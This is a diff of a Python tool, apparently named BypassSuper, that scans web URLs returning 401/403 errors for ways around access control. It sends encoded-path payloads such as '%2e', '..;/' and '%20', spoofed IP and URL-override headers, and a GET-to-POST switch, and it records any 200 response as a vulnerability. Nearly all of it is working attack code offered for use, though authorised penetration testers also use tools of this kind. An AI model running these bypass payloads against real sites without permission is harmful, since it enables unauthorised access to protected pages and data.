@@ -1,7 +1,10 @@
 #!/usr/bin/python3
 # -*- coding: UTF-8 -*-
+
+
 __author__ = "summersec"
 
+import time
 import csv
 import threading
 import optparse
@@ -9,72 +12,168 @@ import sys
 import logging
 import http.client
 from urllib import parse
-import argparse
 from queue import Queue
 import requests
+import urllib3
 
-threadList = []
 
+# 关闭警告
+urllib3.disable_warnings()
+
+times = time.localtime()
+# 保存结果文件名 -f/--file的时候用到
+filename =  str("./result/" +
+    str(times.tm_year) + str(times.tm_mon) + str(times.tm_mday) + str(times.tm_hour) + str(times.tm_min) + str(
+        times.tm_sec) + "-result.csv")
+# 保存日志文件名
+logname = str("./log/" +
+    str(times.tm_year) + str(times.tm_mon) + str(times.tm_mday) + str(times.tm_hour) + str(times.tm_min) + str(
+        times.tm_sec) + "-log.log")
+# 全局处理
+# 保存扫描日志
+# 日志处理
+httpclient_logger = logging.getLogger("http.client")
+logging.basicConfig(level=logging.DEBUG,  # 控制台打印的日志级别
+                            filename=logname,
+                            filemode='w'  ##模式，有w和a，w就是写模式，每次都会重新写日志，覆盖之前的日志
+                            # a是追加模式，默认如果不写的话，就是追加模式
+                            # format=
+                            # '%(asctime)s - %(pathname)s[line:%(lineno)d] - %(levelname)s: %(message)s'
+                            # # 日志格式
+                            )
+
+
+def httpclient_logging_patch(httpclient_logger, level=logging.DEBUG):
+    # self.httpclient_logger = httpclinet_logger
+
+    # """Enable HTTPConnection debug logging to the logging framework"""
+    def httpclient_log(*args):
+        httpclient_logger.log(level, " ".join(args))
+
+    # mask the print() built-in in the http.client module to use
+    # logging instead
+    http.client.print = httpclient_log
+    # enable debugging
+    http.client.HTTPConnection.debuglevel = 1
 
 # 继承式多线程
 class MyThread(threading.Thread):
     def __init__(self, queue):
         threading.Thread.__init__(self)
-        queue = Queue()
         self.q = queue
+        self.thread_stop = False
 
     # start()方法启动线程将自动调用 run()方法
     def run(self):  # 线程执行体
         # 从队列取出数据，每次一条，多个线程同时取，直到取空
-        while not self.q.empty():
-            BypassSuper.Req(self.q.get())
+        # print(str(self.q.empty()) + " self.q.empty()")
+        while not self.thread_stop:
+            url = self.q.get()
+            try:
+                # print("self.q.get(): " + url)
+                BypassSuper().Req(url)
+            except Exception as e:
+                print(e)
+                self.thread_stop = True
+            finally:
+                break
 
 
 class BypassSuper:
     def __init__(self):
+        print(time.asctime() + " Init BypassSuper!")
 
-        with open(mode="a+", file="result.csv", encoding="utf-8", newline="") as file:
+
+
+    def result(self):
+        # filename = file + "-result.csv"
+        # logname = file + "-log.log"
+        # print(filename)
+        with open(mode="a+", file=self.filename, encoding="utf-8", newline="") as file:
             f_csv = csv.writer(file)
             f_csv.writerow(['PreURL', "lastURL", "respone", "payload"])
             file.close()
 
-
     # 请求url
     def Req(self, url):
-        # url = url
-        # url = "https://ssov2.myoas.com:443/sso/user/login"
-        req = requests.get(url=url, verify=False)
 
-        if 400 <= req.status_code <= 500:
-            req2 = requests.post(url=url, verify=False)
-            if req2.status_code == 200:
-                print(req)
-                self.SaveResult(Preurl=url, lasturl="post", respone=req2.text, payload="get to post")
-            else:
+        try:
+            print(time.asctime() + " Determining the URL: " + url + " status code! ")
+            httpclient_logging_patch(httpclient_logger)
+            req = requests.request(method="GET", url=url, timeout=5, verify=False, headers={
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
+
+            })
+            print(time.asctime() + " The URL of status_code is " + str(req.status_code))
+        except Exception as e:
+            print(time.asctime() + " something is error!")
+            print(time.asctime() + " Exception: " + str(e))
+        finally:
+            pass
+
+        try:
+            if 400 <= req.status_code <= 500:
+                # print(time.asctime() + " The URL of status_code is " + str(req.status_code))
+                print(time.asctime() + " The Scanner is running! ")
+                httpclient_logging_patch(httpclient_logger)
+                req2 = requests.request(method="POST", url=url, timeout=5, verify=False, headers={
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
+
+                })
+                if req2.status_code == 200:
+                    # print(req)
+                    print(time.asctime() + " " + url + "has the vuls! payload : get to post !")
+                    self.SaveResult(Preurl=url, lasturl="post", respone=req2.text, payload="get to post")
                 self.Scan(url)
+            if 500 < req.status_code < 400:
+                print(time.asctime() + " The URL of status_code is " + str(req.status_code))
+                pass
+
+
+
+        except Exception as e:
+            print(time.asctime() + " something is error!")
+            print(time.asctime() + " Exception: " + str(e))
+        finally:
+            pass
+
 
     # 保存扫描结果
     def SaveResult(self, Preurl, lasturl, respone, payload):
-
-        with open(mode="a+", file="result.csv", encoding="utf-8", newline="") as file:
+        with open(mode="a+", file=filename, encoding="utf-8", newline="") as file:
             f_csv = csv.writer(file)
             f_csv.writerow([Preurl, lasturl, respone, payload])
+            print(time.asctime() + " save is secuss!")
             file.close()
 
     # 发起扫描
     def Scan(self, url):
+        print(time.asctime() + " Scan: " + url)
         result = self.UrlParse(url=url)
-        LastPath = result[3:4]
-        Param = result[5:6]
-        Upath = result[1:2]
-        UHost = result[2:3]
+        LastPath = result[3]
+        Param = result[5]
+        Upath = result[1]
+        UHost = result[2]
+        PreviousPath = result[4]
 
-        PreviousPath = result[4:5]
 
-        payloads = ["%2e" + LastPath, "%2e/" + LastPath, LastPath + "/.", "./" + LastPath + "/./",
-                    "%20/" + LastPath, LastPath + "%20/", "%20" + LastPath + "%20/", LastPath + "..;/", LastPath + "?",
-                    LastPath + "??"
-            , "/" + LastPath + "//", LastPath + "/", LastPath + "/.randomstring", LastPath + ".json"]
+
+
+        payloads = ["%2e" + LastPath,
+                    "%2e/" + LastPath,
+                    LastPath + "/.",
+                    "./" + LastPath + "/./",
+                    "%20/" + LastPath,
+                    LastPath + "%20/",
+                    "%20" + LastPath + "%20/",
+                    LastPath + "..;/",
+                    LastPath + "?",
+                    LastPath + "??",
+                    "/" + LastPath + "//",
+                    LastPath + "/",
+                    LastPath + "/.randomstring",
+                    LastPath + ".json"
+                    ]
         hpayloads1 = ["X-Custom-IP-Authorization",
                       "X-Host",
                       "X-Client-IP",
@@ -156,123 +255,158 @@ class BypassSuper:
         payload4 = "X-Frame-Options"
         payload5 = "Allow"
 
-        for p in payloads:
-            self.ScanOne(url, UHost, PreviousPath=PreviousPath, payload=p)
+        print(time.asctime() + " The first scanning method is running!")
+        if Upath != "":
 
-        for hp in hpayloads1:
-            self.ScanTwo(url=url, payload1=hp, payload2=payload1)
+            for p in payloads:
+                # print(p)
+                self.ScanOne(url, UHost, PreviousPath=PreviousPath, payload=p)
+            print(time.asctime() + " The second scanning method is running!")
+            for hp in hpayloads1:
+                self.ScanTwo(url=url, payload1=hp, payload2=payload1)
 
-        for hp2 in hpayloads2:
-            self.ScanTwo(url=url, payload1=hp2, payload2="/" + LastPath)
-            self.ScanTwo(url=url, payload1=hp2, payload2="/" + Upath)
+            for hp2 in hpayloads2:
+                self.ScanTwo(url=url, payload1=hp2, payload2="/" + LastPath)
+                self.ScanTwo(url=url, payload1=hp2, payload2=Upath)
 
-        self.ScanTwo(url=url, payload1=payload2, payload2=payload3)
-        self.ScanTwo(url=url, payload1=payload4, payload2=payload5)
-
-        for hsp1 in hspayloads1:
-            self.ScanThree(url=url, payload1=hsp1, payload2=Upath)
-
-        for hsp2 in hspayloads2:
-            self.ScanThree(url=url, payload1=hsp2, payload2=url)
-
-
+            self.ScanTwo(url=url, payload1=payload2, payload2=payload3)
+            self.ScanTwo(url=url, payload1=payload4, payload2=payload5)
+            print(time.asctime() + " The third scanning method is running!")
+            for hsp1 in hspayloads1:
+                # print("hspayloads1")
+                self.ScanThree(url=url, host=UHost, payload1=hsp1, payload2=Upath)
+        else:
+            for hsp1 in hspayloads1:
+                # print("hspayloads1")
+                self.ScanThree(url=url, host=UHost, payload1=hsp1, payload2=url)
+            for hsp2 in hspayloads2:
+                # print("hspayloads2")
+                self.ScanThree(url=url, host=UHost, payload1=hsp2, payload2=url)
 
     # 第一种方式payload
     def ScanOne(self, url, Uhost, PreviousPath, payload):
         lastU = Uhost + PreviousPath + payload
-        req = requests.get(url=lastU, verify=False, header={
+        print(time.asctime() + " Scanning: " + url + " with the payload (" + payload + ")")
+        try:
+            httpclient_logging_patch(httpclient_logger)
+            req = requests.get(url=lastU, verify=False, timeout=5, headers={
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
 
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
+            })
+            if req.status_code == 200:
+                print(time.asctime() + " " + url + " has the vuls! payload : " + payload)
+                self.SaveResult(Preurl=url, lasturl=lastU, respone=req.text, payload=payload)
+            else:
+                print(time.asctime() + " " + url + " donot have the vuls! payload : " + payload)
+        except Exception as e:
 
-        })
+            print(time.asctime() + " something is error! ")
+            print(time.asctime() + " Scanning: " + url + " with the payload (" + payload + ")")
+            print(time.asctime() + " Exception: " + str(e))
+        finally:
 
-        if req.status_code == 200:
-            self.SaveResult(Preurl=url, lasturl=lastU, respone=req.text, payload=payload)
+            pass
 
     # 第二种方式payload
     def ScanTwo(self, url, payload1, payload2):
 
         payload = payload1 + ": " + payload2
+        print(time.asctime() + " Scanning: " + url + " with the payload (" + payload + ")")
+        try:
+            httpclient_logging_patch(httpclient_logger)
+            req = requests.get(url=url, verify=False, timeout=5, headers={
+                payload1: payload2,
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
 
-        req = requests.get(url=url, verify=False, header={
-            payload1: payload2,
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
+            })
+            if req.status_code == 200:
+                print(time.asctime() + " " + url + " has the vuls! payload : " + payload)
+                self.SaveResult(Preurl=url, lasturl=url, respone=req.text, payload=payload)
+            else:
+                print(time.asctime() + " " + url + " donot have the vuls! payload : " + payload)
+        except Exception as e:
 
-        })
-        if req.status_code == 200:
-            self.SaveResult(Preurl=url, lasturl=url, respone=req.text, payload=payload)
+            print(time.asctime() + " something is error! ")
+            print(time.asctime() + " Scanning: " + url + " with the payload (" + payload + ")")
+            print(time.asctime() + " Exception: " + str(e))
+        finally:
+
+            pass
 
     # 第三种方式payload
-    def ScanThree(self, url, Uhost, payload1, payload2):
+    def ScanThree(self, url, host, payload1, payload2):
 
         payload = payload1 + ": " + payload2
+        # print(payload)
+        print(time.asctime() + " Scanning: " + url + " with the payload (" + payload + ")")
+        try:
+            httpclient_logging_patch(httpclient_logger)
+            req = requests.get(url=host, verify=False, timeout=5, headers={
+                payload1: payload2,
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
 
-        req = requests.get(url=Uhost, verify=False, header={
-            payload1: payload2,
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
+            })
+            if req.status_code == 200:
+                print(time.asctime() + " " + url + " has the vuls! payload : " + payload)
+                self.SaveResult(Preurl=url, lasturl=host, respone=req.text, payload=payload)
+            else:
+                print(time.asctime() + " " + url + " donot have the vuls! payload : " + payload)
+        except Exception as e:
 
-        })
-        if req.status_code == 200:
-            self.SaveResult(Preurl=url, lasturl=Uhost, respone=req.text, payload=payload)
+            print(time.asctime() + " something is error! ")
+            print(time.asctime() + " Scanning: " + url + " with the payload (" + payload + ")")
+            print(time.asctime() + " Exception: " + str(e))
+        finally:
+            pass
 
-    # 保存扫描日志
-    def Log(self):
-        logging.basicConfig(level=logging.DEBUG,  # 控制台打印的日志级别
-                            filename='log.log',
-                            filemode='w'  ##模式，有w和a，w就是写模式，每次都会重新写日志，覆盖之前的日志
-                            # a是追加模式，默认如果不写的话，就是追加模式
-                            # format=
-                            # '%(asctime)s - %(pathname)s[line:%(lineno)d] - %(levelname)s: %(message)s'
-                            # # 日志格式
-                            )
-        httpclient_logger = logging.getLogger("http.client")
-        self.httpclient(httpclient_logger, level=logging.DEBUG)
 
-    # 日志处理
-    def httpclient(self, httpclinet_logger, level=logging.DEBUG):
 
-        self.httpclient_logger = httpclinet_logger
 
-        # """Enable HTTPConnection debug logging to the logging framework"""
-        def httpclient_log(*args):
-            self.httpclient_logger.log(level, " ".join(args))
-
-        # mask the print() built-in in the http.client module to use
-        # logging instead
-        http.client.print = httpclient_log
-        # enable debugging
-        http.client.HTTPConnection.debuglevel = 1
 
     # url解析
     def UrlParse(self, url):
         url = url  # 整个URL
         result = parse.urlparse(url)
         Upath = result.path  # 完整的Path
+        host = str(result.netloc).split(':')[0]  # 主机
         Uhost = result.scheme + "://" + result.netloc  # 主机
-        LastPath = str(Upath).split('/')[-1]  # 最后一个Path
-        PreviousPath = str(Upath).split(LastPath)[0]  # 之前的Path
+        if Upath != "":
+            LastPath = str(Upath).split('/')[-1]  # 最后一个Path
+            PreviousPath = str(Upath).split(LastPath)[0]  # 之前的Path
+        else:
+            LastPath = ""
+            PreviousPath = ""
         Param = result.query  # 参数
 
-        return [url, Upath, Uhost, LastPath, PreviousPath, Param]
+        return [url, Upath, Uhost, LastPath, PreviousPath, Param, host]
 
+    # 从文件中读取url
     def URLS(self, file, nums):
-        self.urlQueue = []
+        self.urlQueue = Queue()
         with open(file=file, mode="r", encoding="utf-8") as u:
             urls = u.readlines()
             u.close()
+        cout = 0
         for url in urls:
+            cout = cout + 1
             u = url.strip("\r\n").strip()
+            print(u)
             self.urlQueue.put(u)
-        self.Threads(nums=nums)
+        print(time.asctime() + " The file is read, there are " + str(cout) +" URLs in total")
+        if cout >= nums:
+            self.Threads(nums=nums)
+        else:
+            print(time.asctime() + " Targets must >= threads ! Targets is " + str(cout) + " And Threads is " + str(nums))
+            sys.exit(0)
+
 
     # 多线程并发请求
     def Threads(self, nums):
-        for i in range(nums + 1):
-            threadList.append(MyThread(self.urlQueue))
-        for t in threadList:
+        # print("nums is " + str(nums))
+        for i in range(nums):
+            t = MyThread(self.urlQueue)
             t.start()
-        for l in threadList:
-            l.join()
+
 
     def main(self):
         print("""
@@ -286,29 +420,37 @@ class BypassSuper:
                         __/ | |                              | |              
                        |___/|_|                              |_|     
                     author: summersec
+                    version: 1.0
                     Github: https://github.com/SummerSec/BypassSuper         
         """)
         parse = optparse.OptionParser()
         parse.add_option('-u', '--url', dest='url', help='Please Enter the Target Site! http://www.baidu.com')
-        parse.add_option('-t', '--threads', dest='threads', type=int, default=10, help='Please Enter the Threading Nums!')
-        parse.add_option('-f', '--file', dest='file', type=str, help='Targets From File! ')
+        parse.add_option('-t', '--threads', dest='threads', type=int, default=5,
+                         help='Please Enter the Threading Nums! Threads Default is 5!')
+        parse.add_option('-f', '--file', dest='file', type=str, help='Targets From File! Targets must >= threads !')
         (options, args) = parse.parse_args()
 
         if options.url == None and options.file == None:
             parse.print_help()
             sys.exit(0)
         elif options.url != None:
-            url = parse.url
+            url = options.url
+            file = self.UrlParse(url=url)
+            self.filename = "./result/" + file[6] + "-result.csv"
+            self.result()
             self.Req(url)
+
+
         elif options.file != None:
             file = options.file
-            t = parse.threads
+            t = options.threads
+            self.filename = filename
+            self.result()
             self.URLS(file=file, nums=t)
+
         else:
-            print("something is error!")
-            return 0
-
-
+            print(time.asctime() + " something is error!")
+            pass
 
 
 if __name__ == '__main__':
